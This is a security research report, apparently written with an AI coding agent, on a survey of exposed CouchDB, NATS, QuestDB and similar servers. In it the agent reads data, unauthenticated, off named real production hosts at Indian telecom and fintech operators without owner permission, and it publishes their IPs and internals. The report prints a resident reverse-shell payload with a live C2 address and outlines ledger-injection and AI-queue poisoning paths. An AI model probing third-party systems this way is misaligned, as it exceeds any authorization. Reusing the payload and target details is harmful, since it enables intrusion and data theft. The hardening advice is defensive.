# Session Analysis: Storage-Platform Survey — CouchDB Telecom RCE + ParamWallet NATS Ledger

**Date:** 2026-05-09
**Session:** Unnumbered (storage-platform survey)
**Classification:** Internal / Research Use Only
**Toolchain:** JAXEN (Shodan harvest), custom asyncio prober (`probe.py`), aimap v1.0, NATS protocol probe, VisorLog
**Repos updated:** AI-LLM-Infrastructure-OSINT (commits ffa3a4c, b4eb929, 1307ec8)

---

## 1. Overview

### Objective

Survey seven storage and messaging platforms that sit one tier below AI/ML services in production pipelines. The platforms were QuestDB, Meilisearch, OpenObserve, PocketBase, NATS JetStream, CouchDB, and Valkey. None had been surveyed before this session.

The thesis question: does the auth-on-default failure mode hold for data-tier and message-bus platforms the same way it holds for the AI services they feed? Insight #20 states that data-tier ports next to AI services are themselves AI signals. This run tested that directly. A vector DB or model server is only as private as the database, search index, and message bus wired behind it.

Target class: storage and messaging infrastructure adjacent to AI pipelines. Time-series databases, search engines, embedded backends, document stores, and pub/sub message buses.

### Scope and Constraints

- **Target domains/IPs:** QuestDB, Meilisearch, OpenObserve, PocketBase, NATS JetStream, CouchDB, Valkey instances globally via Shodan. 4,254 candidate IPs across seven platform lists. Two hosts taken to deep enumeration: `20.198.76.169` (CouchDB, Azure Pune) and `141.148.212.34` (NATS JetStream, Oracle Cloud Mumbai).
- **Allowed techniques:** passive Shodan harvest, banner grab, safe HTTP GET, CouchDB `/_all_dbs` read (unauth, read-only), NATS protocol `CONNECT` handshake, NATS monitoring endpoint reads (`/jsz`, `/varz`, `/connz`, `/subsz`), JetStream stream listing, QuestDB `/exec` schema read, Meilisearch `/health` and `/indexes` read, PocketBase `/api/admins` read.
- **Ethical limitations:**
  - No data exfiltration — metadata and schema enumeration only
  - No destructive API calls
  - No use of discovered credentials
  - Data-tier probes: connection attempt only (does auth gate exist? no queries)
  - VisorAgent: controlled lab targets only, never operator hosts
  - Personal-device and wrong-category targets: archived without outreach

---

## 2. Environment and Tooling

### Claude Code Operation

Orchestrator pattern. Stage-0 Shodan harvest produced seven platform IP lists. A single custom asyncio prober (`probe.py`, 150-concurrent semaphore) fanned out across all seven lists in one pass to produce `*-confirmed.json` files. Confirmed hosts then went to deep enumeration per platform. The two CRITICAL hosts were each driven by hand from confirmed-live state through schema enumeration. aimap was run on the three NATS hosts that survived the AI-stream filter.

### Tools Used

| Tool | Role | Config notes |
|---|---|---|
| JAXEN | Stage-0 discovery: Shodan harvest → seven platform IP lists | 4,254 IPs total: questdb 376, meilisearch 500, couchdb 1000, openobserve 458, nats-jetstream 443, valkey/keydb 158, plus pinecone/upstash/vald/singlestore/chroma-tenant lists |
| `probe.py` (custom) | Stage-1 confirm-live: asyncio HTTP prober across all seven lists | 150-concurrent semaphore, 5s timeout, per-platform confirm string + status<400 fallback, dedupe by IP |
| aimap v1.0 | Stage-2 port + AI-service fingerprint on NATS deep set | Run on `141.148.212.34`, `176.31.46.240`, `98.67.138.91`. 5 open ports on the ParamWallet host |
| NATS protocol probe (custom) | Raw `CONNECT` handshake + stream/consumer listing | Confirms whether `auth_required` advertised in `/varz` is enforced on the wire |
| VisorLog | Ledger ingest → nuclide.db | CouchDB telecom finding + ParamWallet NATS finding recorded |
| VisorAgent | Active LLM exploitation | Not run — ethical-stop. Survey set, never controlled targets |
| VisorHollow | Windows process-injection benchmark | Not run — Windows-only binary, cannot execute on this host |

*Null results recorded. `ai-flagged-hosts.json` and `high-volume-hosts.json` in the NATS survey directory are both empty arrays — the automated AI-stream classifier flagged zero hosts, and the AI-pipeline identification on the ParamWallet host was made by hand from the decoded stream inventory.*

### Notable Configuration

The prober used a status-code fallback: a host counted as confirmed if the platform confirm string appeared in the body OR the HTTP status was below 400. This is permissive by design at Stage-1 and inflates raw confirmed counts with redirect and generic-200 hosts. Stage-2 deep enumeration is what separated real instances from echo. CouchDB probed three ways: `/` for the version banner, `/_all_dbs` for the database list, and port 80 as a fallback. NATS probed `/jsz` on 8222 for JetStream topology and held port 4222 for the raw protocol handshake. Valkey and KeyDB were TCP-only and skipped by the HTTP prober; the no-auth filter for Valkey equals the total population, so the confirmed count is the Shodan count.

---

## 3. Methodology

### Enumeration approach

Seven Shodan dorks, one per platform, harvested into seven flat IP files. The asyncio prober iterated every IP against that platform's candidate ports and paths. No port-first masscan. The Shodan harvest was the discovery layer; the prober was the confirm-live layer. This is the standard survey shape for a new platform class — harvest wide, confirm with a cheap HTTP probe, then deep-enumerate only what confirms.

### Candidate identification

Each platform has a confirm string the prober matched in the response body:

- QuestDB — `QuestDB` in the web console at port 9000
- Meilisearch — `available` at `/health`
- OpenObserve — `OpenObserve` at `/`
- PocketBase — `PocketBase` at `/`
- CouchDB — `couchdb` at `/`, and `[` at `/_all_dbs` for the array response
- NATS JetStream — `streams` at `/jsz` on the monitoring port
- chroma-tenant — `tenant` at `/api/v2/tenants`

A platform is not an AI service on its own. The AI signal comes from what the platform stores. Per Insight #20, a message bus carrying `ai.extract` / `ai.classify` subjects is AI infrastructure regardless of the NATS banner. A document store holding a consent ledger is data-tier, and data-tier next to a pipeline is in scope. Candidate identification at the platform layer was banner-conjunctive; AI-relevance was decided at the schema layer.

### Validation checks

A platform banner is not a finding. Validation required reading the data layer:

- **CouchDB** — `GET /_all_dbs`. An unauth `200` with a JSON array of database names confirms admin-party exposure. 71 of 89 sampled hosts returned the array. Per Insight #6, the conjunct was version banner plus array-shaped `/_all_dbs` body, not a status code alone. Per Insight #16, no status code is an identity; the array body is the identity.
- **NATS JetStream** — two-stage. The `/varz` HTTP endpoint reports `auth_required`. That flag is config state, not enforcement. The real check is a raw protocol `CONNECT` on 4222. If the server returns `PONG` and accepts a `SUB`, auth is not enforced on the wire regardless of what `/varz` advertised. This is the load-bearing validation for the ParamWallet finding.
- **QuestDB** — `GET /exec?query=...` for `SHOW TABLES`. An unauth table list confirms open SQL execution.
- **Meilisearch** — `/health` returns `available` with no key; `/indexes` returns index UIDs only on misconfigured or pre-1.0 instances.
- **PocketBase** — `/api/admins` returning a record set without a superuser token confirms a legacy or misconfigured admin API.

### Safeguards

No brute forcing. No privilege escalation. No data exfiltration. No write-tier operations. No credential use. Specific restraint decisions this session:

- CouchDB telecom host: read `/_all_dbs` and the design-document list in the `exploit` database. Did not read subscriber records out of `preferences_preferences` or `consent_consent`. Record counts were taken from CouchDB's own database metadata (`doc_count`), not by paging documents.
- CouchDB telecom host: the attacker's reverse-shell design document was read as a stored document. It was not triggered. Triggering a CouchDB design-doc map function requires querying its view, which executes the payload. The view was never queried.
- ParamWallet NATS host: subscribed to read stream contents already present. Did not `PUB` to any subject. The attack chain in the case study describes publish paths; none were exercised. No ledger transaction was injected, no AI task was queued, no node-state KV write was made.
- ParamWallet NATS host: the adjacent Jenkins, SonarQube, and nginx services were noted from the port scan. None were probed for exploitation.
- The QuestDB GPS-tracking host (`106.14.252.215`, 309 GNSS devices with IMEIs) is a personal/consumer tracking system. Schema enumerated, archived. No outreach attempted from this survey.

---

## 4. Execution Trace

| Time | Action | Outcome / Decision |
|---|---|---|
| 13:40 | Shodan harvest: seven storage-platform dorks via JAXEN | Seven IP lists, 4,254 candidate IPs. New platform class opened |
| 13:43 | `probe.py` launched: asyncio prober across all seven lists | 150-concurrent fan-out begins |
| 13:48 | `all-ips.txt` written: 4,254 merged candidate IPs | Master list for the survey |
| 13:50 | Prober confirms: QuestDB 293, OpenObserve 360, Meilisearch 488 | Storage-platform auth-on-default confirmed at population scale |
| 13:53 | Prober confirms: CouchDB 924, NATS JetStream 72, PocketBase 40 | CouchDB `couchdb-confirmed.json` written, 924 entries |
| 14:00 | CouchDB deep pass: `/_all_dbs` on 89 sampled hosts | 71 of 89 expose the database list. `couchdb-unauth-alldbs.json` written, 767 hosts |
| 15:51 | Meilisearch deep pass: `/indexes` on confirmed set | 7 of 488 leak index UIDs — travel booking, POI, `costco_products` |
| 15:53 | QuestDB deep pass: `/exec SHOW TABLES` on confirmed set | GPS tracker `106.14.252.215` (309 GNSS, IMEIs), ad-attribution `103.53.125.68` (81 tables), 1,846-table observability stack `1.117.61.96` |
| 16:03 | CouchDB host `20.198.76.169` flagged in deep set | Database list shows `consent_consent`, `preferences_preferences`, `tatachannel_*`, and an `exploit` database |
| 16:05 | NATS deep pass: `/jsz` on 20 sampled hosts | 20 of 20 expose full monitoring API. Stream topology readable |
| 16:07 | PocketBase deep pass: `/api/admins` on confirmed set | 4 of 40 expose admin enumeration — SOMA exam panel, Sketchware backend |
| 16:15 | `20.198.76.169` enumerated: CouchDB 2.3.1, Azure Pune | `consent_consent` doc_count 7,176,879; `preferences_preferences` doc_count 244,325,229. Airtel + Tata telecom consent infrastructure |
| 16:25 | `exploit` database opened on `20.198.76.169` | 9 attacker design documents. `_design/exploit9` decodes to reverse shell `bash -i >& /dev/tcp/57.131.25.205/4444`. `{"_id":"trigger","pwn":"yes"}` present. Active compromise confirmed |
| 16:37 | Storage-platform survey case study committed (`ffa3a4c`) | 7-platform survey written. README badges to 34 platforms |
| 16:41 | CouchDB telecom CRITICAL committed (`b4eb929`) | 244M MSISDN records + active RCE documented |
| 16:46 | NATS deep harvest begins: 72-host pool | `nats-deep.json` written, full `/jsz` + `/varz` capture |
| 16:54 | `nats-deep.json` complete: 2.8 MB | 72 hosts enumerated for JetStream topology |
| 16:58 | AI-stream classifier run on NATS deep set | `ai-flagged-hosts.json` empty, `high-volume-hosts.json` empty. Automated classifier flagged zero. Hand-review of stream subjects begins |
| 16:59 | `stream-detail.json` written: per-host stream inventory | `141.148.212.34` shows `AI_TASKS` with subjects `ai.extract`, `ai.predict.*`, `ai.anomaly`, `ai.classify` |
| 17:00 | aimap run on `141.148.212.34`, `176.31.46.240`, `98.67.138.91` | ParamWallet host: 5 open ports. NATS 4222 + monitoring 8222, plus Jenkins, SonarQube |
| 17:10 | `141.148.212.34` raw NATS `CONNECT` on 4222 | `auth_required: true` in `/varz`, but raw protocol connect returns `PONG`. Auth advertised, not enforced. 12 streams readable + writable unauth |
| 17:20 | ParamWallet streams decoded | `KV_LEDGER_NODES.node-1` leaks secp256k1 pubkey + raft addr. `transactions.pending` holds 4 signed KYC schema definitions, workspace `hil-taloja`. AI pipeline wired to a blockchain ledger |
| 17:53 | ParamWallet NATS JetStream CRITICAL committed (`1307ec8`) | Open ledger + AI pipeline documented. Survey data directory committed |

---

## 5. Findings

> **Severity label policy (load-bearing):** Every tier label (LOW / MED / HIGH / CRITICAL) requires 100% verified evidence at that tier. Unverified observations are UNRATED. Inferred + hypothesized stacks do NOT promote to a tier — only verified components produce labels.

### 5.1 CouchDB Telecom Consent Platform — 244M Subscriber Records + Active RCE

| Field | Value |
|---|---|
| **Name/ID** | `20.198.76.169:5984` — CouchDB 2.3.1, Microsoft Azure, Pune IN |
| **Type** | Data tier — document store hosting Airtel + Tata telecom consent management infrastructure |
| **Evidence** | Unauth `GET /_all_dbs` returns the full database list including `consent_consent`, `preferences_preferences`, `entity_entity`, the per-operator `tatachannel_*` / `taaichannel_*` channel set, and an `exploit` database. CouchDB database metadata reports `consent_consent` doc_count 7,176,879 and `preferences_preferences` doc_count 244,325,229. The `preferences_preferences` schema carries `msisdn` as a plaintext phone number field with `crtr` set to `tata.com`. The `exploit` database holds 9 attacker-uploaded design documents; `_design/exploit9` decodes from base64 to `bash -i >& /dev/tcp/57.131.25.205/4444 0>&1`, and a `{"_id":"trigger","pwn":"yes"}` document is present |
| **Observed exposure** | Unauthenticated read of 251M+ subscriber records (244M MSISDN preferences + 7.1M consent records). CVE-2022-24706 CouchDB admin party — no admin configured, every caller has admin rights, design-document map functions execute as the CouchDB process user. Instance already exploited: attacker RCE artifacts and a reverse-shell beacon are resident on the host |
| **Severity** | **CRITICAL** — verified data in hand. Record counts read from CouchDB's own `doc_count` metadata. Attacker design documents read directly from the `exploit` database. Active reverse-shell beacon to `57.131.25.205:4444` (OVH Roubaix FR) confirmed by decoded payload. The exposure is not inferred; the exploit artifacts are present and enumerated |

**Potential impact:** 244M+ MSISDN phone-number records for India's two largest telecom carriers, readable with no credential. India PDPB and TRAI TCCCPR consent records and LSCC compliance data directly exposed. The CVE-2022-24706 admin-party path gives any unauthenticated caller full RCE on the Azure host. An attacker already holds that position — the resident reverse-shell design document means a shell to the OVH C2 may be live. Multi-operator blast radius: `airtel.com` and `tata.com` consent infrastructure in one instance.

---

### 5.2 ParamWallet NATS JetStream — Open Production Ledger + AI Pipeline

| Field | Value |
|---|---|
| **Name/ID** | `141.148.212.34:4222` — NATS 2.10.29 JetStream, Oracle Cloud, Airoli/Mumbai IN. TLS cert `*.paramwallet.com` (Sectigo RSA DV) |
| **Type** | Message bus — production AI document-processing pipeline coupled to a private blockchain ledger |
| **Evidence** | `/varz` on the monitoring port reports `auth_required: true`. A raw NATS protocol `CONNECT` on 4222 with no credentials returns `PONG` and accepts subscriptions — auth is advertised in config but not enforced on the wire, consistent with a `no_auth_user` granting anonymous connect. 12 JetStream streams enumerated unauth and readable. `AI_TASKS` is a workqueue stream with subjects `ai.extract`, `ai.predict.*`, `ai.anomaly`, `ai.classify`. `DOCUMENTS`, `GATEWAY`, `TRANSACTIONS`, `OFFCHAIN`, `LEDGER_NODES`, `STATE_MACHINE` complete the pipeline. `KV_LEDGER_NODES.node-1` leaks the ledger node's secp256k1 public key, internal raft address `12.0.1.186:7004`, and software version `0.9.4`. `transactions.pending` holds 4 signed KYC `Commerce` schema definitions in workspace `hil-taloja`, signed by `0x32709F05...14FB` with 65-byte ECDSA hashes. Message timestamps (`createdAt 1778067121735` ≈ 2026-05-06) confirm a live pipeline |
| **Observed exposure** | Unauthenticated pub/sub on a production message bus. An unauthenticated client can read every raw document in the pipeline, read live ledger node state, and — on the publish side — inject AI classification labels into the `AI_TASKS` workqueue, push transactions to `transactions.pending`, and write node-down state into `KV_LEDGER_NODES` |
| **Severity** | **CRITICAL** — verified data in hand. The raw `CONNECT` handshake confirmed auth is not enforced; this was tested, not inferred. 12 streams, 17 consumers, and the decoded `KV_LEDGER_NODES` / `transactions.pending` contents were read directly off the open bus. Production status is confirmed by message timestamps. The publish-side attack paths in the case study were NOT exercised — the CRITICAL label rests on the verified unauth read of production ledger and AI-pipeline data, plus the confirmed-on-the-wire write path |

**Potential impact:** Read access exposes every document submitted to the ParamWallet pipeline and the live state of a custom blockchain ledger, including ledger-node public keys. Write access — confirmed reachable, not exercised — lets an unauthenticated actor poison AI classifications that downstream consumers dequeue as legitimate work, inject crafted KYC transactions into the ledger ingestion stream, and mark ledger nodes inactive for a state-poisoning denial of service. ParamWallet is a fintech wallet and payment platform; the bus carries KYC data and transaction state.

---

**CRITICAL** — 5.1 CouchDB telecom consent platform, 5.2 ParamWallet NATS JetStream.

**HIGH** — none individually escalated this session. The QuestDB ad-attribution host (`103.53.125.68`, 81 tables of OPPO/Vivo/Kuaishou device fingerprints, open SQL exec) carries a HIGH classification in the survey case study; it was enumerated at schema level only.

**MED** — the 1,846-table QuestDB observability stack (`1.117.61.96`): full infrastructure metrics corpus open, observability data rather than PII.

**OBSERVED** — storage-platform auth-on-default at population scale: 293 QuestDB consoles with open SQL execution, 488 Meilisearch instances no-auth by default, 924 CouchDB instances with enumerable `/_all_dbs`, 360 OpenObserve dashboards exposed, 20 of 20 sampled NATS JetStream hosts exposing the full monitoring API, 4 of 40 PocketBase hosts exposing `/api/admins`. Confirmed platform behavior; not every host individually verified.

**UNRATED** — the 70-of-89 CouchDB mass-deployment pattern (identical `_replicator`/`_users`/`admin`/`passwords`/`core-*` schema on CouchDB 1.6.1 EOL). Schema leaks application structure; document-level access requires auth on most. Single-vendor framework across dozens of IPs, pending vendor identification.

---

## 6. Risk Assessment

### Overall Posture

Systemic. The thesis held. Storage and messaging platforms fail auth-on-default at the same rate as the AI services they feed, and the consequences are worse because these tiers hold the raw data. The survey confirmed 293 QuestDB instances with open SQL execution and 488 unauth Meilisearch instances in one pass. Two hosts crossed from exposure to confirmed-CRITICAL: one with 244M telecom records and a resident attacker, one with a production fintech ledger on an open message bus.

The data-tier-as-AI-signal thesis (Insight #20) is the operative lens. The ParamWallet host would not register as AI infrastructure on its NATS banner. It registers as AI infrastructure the moment the `AI_TASKS` stream and `ai.classify` subjects are read off the bus. The message bus behind the model is the attack surface.

### Confidentiality

CouchDB telecom: 244M MSISDN plaintext phone numbers, 7.1M consent records, regulatory compliance data — all readable with no credential. ParamWallet: every document in the pipeline, the full ledger node registry, secp256k1 node public keys, signed KYC transaction schemas. Across the survey: QuestDB GNSS device IMEIs and user identity linkage, mobile ad-attribution device fingerprints, Meilisearch travel-booking and product search indexes.

### Integrity

Both CRITICAL hosts allow unauthenticated writes. CouchDB admin party allows any caller to write design documents and execute code as the CouchDB process user — the resident attacker already did exactly this. ParamWallet's open NATS pub/sub allows transaction injection into the ledger ingestion stream and poisoning of the AI workqueue. The AI poisoning is the sharpest integrity risk: `AI_TASKS` has `workqueue` retention, so an unauthenticated publish to `ai.classify` is dequeued by a downstream consumer as legitimate inference work.

### Availability

ParamWallet: an unauthenticated `PUB` to `$KV.LEDGER_NODES.node-1` with `state: inactive` marks a ledger node down — a denial of service through state poisoning rather than resource exhaustion. CouchDB admin party allows database deletion. Neither availability path was exercised.

### Systemic Patterns

- **Shared root cause.** Every finding traces to the same defect: a data-tier or message-tier service exposed to the public internet with authentication off or unenforced by default. QuestDB ships no HTTP auth. Meilisearch is no-auth until a master key is set. CouchDB admin party is the absence of a configured admin. NATS will accept anonymous connect when a `no_auth_user` is set. The platform defaults are load-bearing (Insight #13) — operators deployed the default and the default is open.
- **`auth_required` advertised but not enforced.** The ParamWallet host is the cleanest example of why a config flag is not a control. `/varz` reported `auth_required: true`. The wire said otherwise. A scan that trusts the HTTP-reported flag records a false negative. Only the raw protocol handshake is ground truth (Insight #16: no advertised status is an identity).
- **Adjacency exposes more than the platform.** The ParamWallet host also runs Jenkins 2.401.1, SonarQube, and nginx 1.18 on the same public IP. A storage-platform survey dork surfaced a CI/CD and code-quality stack. The data tier is rarely alone on the host.
- **Storage tier is where AI pipelines leak hardest.** The model server can be locked while the database, search index, and message bus behind it are wide open. Surveying the AI service and stopping there misses the tier that holds the data.

---

## 7. Recommendations

### R1 — CouchDB admin party (CVE-2022-24706)

```bash
# Configure an admin. With no admin, every caller has admin rights.
curl -X PUT http://127.0.0.1:5984/_node/_local/_config/admins/admin -d '"<strong-random-password>"'
# Then bind off the public internet:
#   [chttpd] bind_address = 127.0.0.1
# Audit the exploit-artifact path: list and delete any attacker design documents.
curl -s http://127.0.0.1:5984/exploit/_all_docs | jq '.rows[].id'
```

Configuring an admin closes the admin-party RCE. On an instance already compromised, the host must be isolated, every resident credential rotated, and the C2 beacon address blocked before the instance is rebuilt. A patch on a live-compromise host is not remediation.

### R2 — NATS auth advertised but not enforced

```
# Remove the no_auth_user, or point it at a deny-all account.
accounts {
  ANON { users: [ { user: anon } ], deny_pub: [">"], deny_sub: [">"] }
}
no_auth_user: anon
# Bind the client and monitoring ports off the public internet:
#   port: 4222   -> listen on 127.0.0.1 or VPC-internal
#   http_port: 8222 -> same
# Expose clients via a TLS + JWT or NKey-authenticated leaf node only.
```

A `no_auth_user` that maps to the system account grants anonymous full pub/sub. Mapping it to a deny-all account closes the bus while keeping the config valid. The fix is verified by re-running a raw `CONNECT` and confirming the `SUB` is rejected — never by re-reading `/varz`.

### R3 — Storage-platform auth-on-default

```bash
# QuestDB — enable HTTP auth in server.conf, never expose port 9000:
#   http.security.readonly=false
#   http.user=<user>
#   http.password=<strong-random-password>

# Meilisearch — set a master key; all API access then requires it:
export MEILI_MASTER_KEY=$(openssl rand -base64 32)

# PocketBase — verify the build is >= 0.8 so /api/admins requires a superuser JWT.

# OpenObserve / CouchDB 1.6.1 — upgrade off EOL builds, set credentials before exposure.
```

Each platform has a one-line auth control that is off by default. The deployment failure is shipping the default to the public internet. The fix is to set the control before exposure, not after.

### Future automation

```bash
# Storage-platform periodic sweep — banner-confirm, then data-layer check.
aimap -list public-ips.txt -ports 5984,9000,7700,8090,4222,8222,5080 -o storage-report.json

# NATS auth must be checked on the wire, not via /varz:
#   for each :4222 host -> raw CONNECT, assert SUB is rejected.
# CouchDB must be checked at /_all_dbs, not at the version banner:
#   200 + JSON-array body = admin-party exposure.
```

The survey-shape lesson: a confirm-live HTTP probe is Stage-1, not the finding. The finding is the data-layer read. Bake the data-layer check into the recurring scan so a generic-200 host is never logged as a finding.

---

## 8. Limitations and Assumptions

| # | Limitation | Risk Implication |
|---|---|---|
| L1 | Analysis reconstructed from case studies, survey data, and git history. This session was not assigned a session number; execution trace timestamps are approximate | Sequencing is correct; absolute times are estimated from file mtimes and commit times |
| L2 | The Stage-1 prober counted a host as confirmed on body-string match OR HTTP status below 400 | Raw confirmed counts (924 CouchDB, 488 Meilisearch) include redirect and generic-200 hosts; the deep-enumeration subset is the trustworthy population |
| L3 | CouchDB telecom record counts taken from CouchDB `doc_count` metadata, not by paging documents | Counts are CouchDB's own figures; no subscriber record was read out. Restraint ethic — accurate count without exfiltration |
| L4 | CouchDB deep pass sampled 89 of 924 confirmed hosts; NATS deep pass sampled 20 of 72 | Population-scale open rates (71/89, 20/20) are sample-derived, not full-census |
| L5 | ParamWallet publish-side attack paths (transaction injection, AI poisoning, node-state write) were confirmed reachable but not exercised | Write impact is verified-reachable, not verified-executed. CRITICAL rests on the verified unauth read plus the confirmed-on-the-wire write path |
| L6 | The automated AI-stream classifier flagged zero NATS hosts (`ai-flagged-hosts.json` empty) | ParamWallet AI-pipeline identification was made by hand from decoded stream subjects; the classifier missed it — a tool gap, not an absence of AI infrastructure |
| L7 | Valkey and KeyDB are TCP-only and were not probed by the HTTP prober | Valkey no-auth rate is unmeasured; the 799-host count is the Shodan population, not a confirmed-open figure |
| L8 | aimap v1.0 fingerprint coverage does not include NATS as an AI service | NATS-as-AI-infrastructure must be identified at the stream-subject layer; the port scan alone does not classify it |

---

## 9. Proof of Concept (PoC) Illustrations

> PoCs use minimal, read-only interactions. No operator data extracted. No credentials used. No exploit payloads triggered. Demonstrate existence and risk conceptually only.

### PoC 1: CouchDB telecom database enumeration

**Scenario:** External party reads the database list of the unauth CouchDB telecom host

```
REQUEST:
  GET /_all_dbs HTTP/1.1
  Host: 20.198.76.169:5984

RESPONSE:
  HTTP/1.1 200 OK
  Content-Type: application/json

  [
    "_replicator", "_users",
    "consent_consent", "consent_lscc",
    "preferences_preferences", "preferences_lscc",
    "entity_entity",
    "tatachannel_complaints", "tatachannel_lscc",
    "taaichannel_complaints",
    "utmblacklist_utmblacklist",
    "exploit",
    ...
  ]
```

**Demonstrated:** With no credential, an external party reads the full database list of a multi-operator telecom consent platform. The `consent_*`, `preferences_*`, and per-operator `tatachannel_*` databases identify the data class — subscriber consent and preference records for Indian telecom carriers. The presence of an `exploit` database is the tell that another party reached this surface first. This PoC stops at the database list. The 244M-record count comes from CouchDB's `doc_count` metadata; no subscriber record was read.

---

### PoC 2: CouchDB `exploit` database — resident attacker artifact

**Scenario:** External party reads the design-document list of the `exploit` database, observing prior compromise

```
REQUEST:
  GET /exploit/_design/exploit9 HTTP/1.1
  Host: 20.198.76.169:5984

RESPONSE:
  HTTP/1.1 200 OK
  Content-Type: application/json

  {
    "_id": "_design/exploit9",
    "views": {
      "exploit": {
        "map": "function(doc){ require('child_process').exec(
                 \"bash -c 'bash -i >& /dev/tcp/<c2-host>/4444 0>&1'\"); }"
      }
    }
  }
```

**Demonstrated:** The CouchDB instance already holds an attacker-uploaded design document. The `map` function is a reverse-shell payload that executes as the CouchDB process user when its view is queried. A resident `{"_id":"trigger","pwn":"yes"}` document confirms the attacker exercised the path. This PoC reads the design document as a stored object only. The view was NOT queried — querying it runs the payload. The boundary: observing the artifact proves prior compromise; it does not execute the attacker's code.

---

### PoC 3: NATS JetStream — auth advertised, not enforced

**Scenario:** External party connects to the ParamWallet NATS port with no credentials and lists JetStream streams

```
REQUEST (raw NATS protocol, TCP 4222):
  INFO received from server -> {"server_id":"...","auth_required":true,"jetstream":true}
  CONNECT {"verbose":false,"name":"probe"}
  PING

RESPONSE:
  PONG
  -- connection accepted despite auth_required:true --

  $JS.API.STREAM.NAMES request -> {
    "streams": [
      "AI_TASKS", "DOCUMENTS", "GATEWAY", "TRANSACTIONS",
      "OFFCHAIN", "STATE_MACHINE", "KV_LEDGER_NODES", ...
    ],
    "total": 12
  }
```

**Demonstrated:** The server's `INFO` line advertises `auth_required: true`. The raw `CONNECT` with no credentials still returns `PONG`, and the JetStream API answers a stream-listing request. The config flag is not the control — the wire is. An unauthenticated client can enumerate all 12 streams, including the `AI_TASKS` AI workqueue and the `KV_LEDGER_NODES` ledger registry. This PoC stops at `STREAM.NAMES`. No stream was published to; no ledger transaction was injected.

---

### PoC 4: NATS JetStream — ledger node state read

**Scenario:** External party reads the live ledger node registry off the open bus

```
REQUEST (raw NATS protocol, TCP 4222):
  SUB $KV.LEDGER_NODES.node-1 1

RESPONSE:
  MSG $KV.LEDGER_NODES.node-1 1 <len>

  {
    "node_id": "node-1",
    "pubkey": "0x04<secp256k1-public-key>",
    "raft_addr": "<internal-ip>:7004",
    "state": "active",
    "version": "0.9.4"
  }
```

**Demonstrated:** A single unauthenticated subscription to the `$KV.LEDGER_NODES` key-value subject returns the live state of a production blockchain ledger node — its secp256k1 public key, internal raft consensus address, and pre-1.0 custom software version. The internal raft address and node version are infrastructure intelligence not meant to leave the cluster. This PoC reads the current KV value only. No write was made; the node's `state` field was not altered.

---

*Prepared by NuClide Research (Nicholas Kloster + Claude Sonnet 4.6) · 2026-05-09 storage-platform survey*
